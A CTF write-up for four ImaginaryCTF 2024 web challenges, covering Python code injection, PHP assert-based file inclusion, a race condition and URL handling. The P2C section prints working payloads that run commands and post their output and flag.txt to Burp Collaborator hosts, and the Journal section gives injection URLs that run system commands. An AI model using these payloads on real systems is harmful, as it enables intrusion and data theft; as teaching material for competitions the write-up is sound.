---
title: 2024 Imaginary CTF Writeup
published: true
---
Here is a write-up I created for the Web track.
## P2C (Python To Color)

### Description

Welcome to Python 2 Color, the world's best color picker from python code!
The flag is located in `flag.txt`.

![](../assets/images/2024_imaginary_CTF/P2C_description.png)

### Source code

```python
from flask import Flask, request, render_template
import subprocess
from random import randint
from hashlib import md5
import os
import re

app = Flask(__name__)

def xec(code):
    code = code.strip()
    indented = "\n".join(["    " + line for line in code.strip().splitlines()])

    file = f"/tmp/uploads/code_{md5(code.encode()).hexdigest()}.py"
    with open(file, 'w') as f:
        f.write("def main():\n")
        f.write(indented)
        f.write("""\nfrom parse import rgb_parse
print(rgb_parse(main()))""")

    os.system(f"chmod 755 {file}")

    try:
        res = subprocess.run(["sudo", "-u", "user", "python3", file], capture_output=True, text=True, check=True, timeout=0.1)
        output = res.stdout
    except Exception as e:
        output = None

    os.remove(file)

    return output

@app.route('/', methods=["GET", "POST"])
def index():
    res = None
    if request.method == "POST":
        code = request.form["code"]
        res = xec(code)
        valid = re.compile(r"\([0-9]{1,3}, [0-9]{1,3}, [0-9]{1,3}\)")
        if res == None:
            return render_template("index.html", rgb=f"rgb({randint(0, 256)}, {randint(0, 256)}, {randint(0, 256)})")
        if valid.match("".join(res.strip().split("\n")[-1])):
            return render_template("index.html", rgb="rgb" + "".join(res.strip().split("\n")[-1]))
        return render_template("index.html", rgb=f"rgb({randint(0, 256)}, {randint(0, 256)}, {randint(0, 256)})")
    return render_template("index.html", rgb=f"rgb({randint(0, 256)}, {randint(0, 256)}, {randint(0, 256)})")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

### Short Answer

Python code injection + burpsuite collaborator exfiltration

Controllable indented value indicates that it is a python code injection vulnerability. But the output is parsed and goes to rgb valuer, so we need another way to exfiltrate command output.

The part that actually execute our command is as follows. It created a new file to store input.

```python
f.write("def main():\n")
f.write(indented)
```

Since it is python environment, we can simply write python code to post data to Burp Collaborator. Be sure to use urllib.request here because it’s part of standard python library comparing to requests. Then click **poll now** to get response.

### POC

```python
import urllib.request
import urllib.parse
import subprocess

output = subprocess.run(["ls"], capture_output=True, text=True).stdout.strip()
url = 'http://cyefjx3rcjlzq6jfcxjwztahr8xzlp9e.oastify.com'
data = urllib.parse.urlencode({'result': output}).encode()
req = urllib.request.Request(url, data=data) 
response = urllib.request.urlopen(req)
print(response.read().decode())
```
![](../assets/images/2024_imaginary_CTF/POC_burp.png)

- Read Flag

```python
import urllib.request
import urllib.parse

output = open("flag.txt").read()
url = 'http://iyklj33xcpl5qcjlc3j2zzanrex5l29r.oastify.com'
data = urllib.parse.urlencode({'result': output}).encode()
req = urllib.request.Request(url, data=data) 
response = urllib.request.urlopen(req)
print(response.read().decode())
```
![](../assets/images/2024_imaginary_CTF/POC_burp2.png)

<br>

## Journal
----

### Description

dear diary, there is no LFI in this app

```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");

  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";

```

### Short Answer

LFI via PHP's 'assert'

> https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert
> 

```url
http://journal.chal.imaginaryctf.org/?file=file1.txt%27%20and%20die(system(%22ls%20/%22))%20or%20%27
```

![](../assets/images/2024_imaginary_CTF/Journal1.jpg)

```url
http://journal.chal.imaginaryctf.org/?file=file1.txt%27%20and%20die(system(%22cat%20/flag-cARdaInFg6dD10uWQQgm.txt%22))%20or%20%27
```

![](../assets/images/2024_imaginary_CTF/Journal2.jpg)
  
<br>

## The Amazing Race

---

### Description

I've hidden my flag in an impenetrable maze! Try as you might, even though it's right there, you'll never get the flag!

![](../assets/images/2024_imaginary_CTF/TheAmazingRace_desc.png)

### Short Answer

web race condition

### Details

Each movement will send a request to backend database to check whether movement is permittted. However, the inconsistence between different  request may open a time window for duplicate movements to somewhere disallowed.

```python

def getCanMove(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT up, down, left, right FROM mazes WHERE id = ?", (mazeId,)).fetchone()
    cur.close()
    con.close()
    return ret
```

Since post request implemented http1.1, we used last-byte sync attack.

```jsx
Burpsuite Repeater -> create group & duplicate tabs -> send group in parallel 
```
<br>

## Crystals

---

```jsx
version: '3.3'
services:
  deployment:
    hostname: $FLAG
    build: .
    ports:
      - 10001:80
```

![](../assets/images/2024_imaginary_CTF/Crystals.png)

### Short Answer
Abnormal characters in URL are not properly handled.

![](../assets/images/2024_imaginary_CTF/Crystals_burp.png)